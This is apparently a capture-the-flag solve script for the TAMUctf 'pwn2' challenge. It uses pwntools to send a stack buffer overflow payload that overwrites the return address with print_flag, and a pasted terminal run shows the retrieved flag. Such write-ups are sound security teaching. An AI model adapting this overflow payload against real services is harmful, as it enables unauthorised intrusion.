from pwn import *

e = ELF("./pwn2")
p = remote("pwn.ctf.tamu.edu", 4322)

p.sendlineafter("me!\n", "A"*0xEF + "A"*4 + p32(e.symbols["print_flag"]))

p.interactive()

'''
shgroup@SH-Group:/mnt/e/Writeup/ctf/TAMUctf/pwnable/pwn2$ python solve.py
[*] '/mnt/e/Writeup/ctf/TAMUctf/pwnable/pwn2/pwn2'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Opening connection to pwn.ctf.tamu.edu on port 4322: Done
[*] Switching to interactive mode
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAK\x85\x0
This function has been deprecated
gigem{3ch035_0f_7h3_p4s7}

[*] Got EOF while reading in interactive
$ 
'''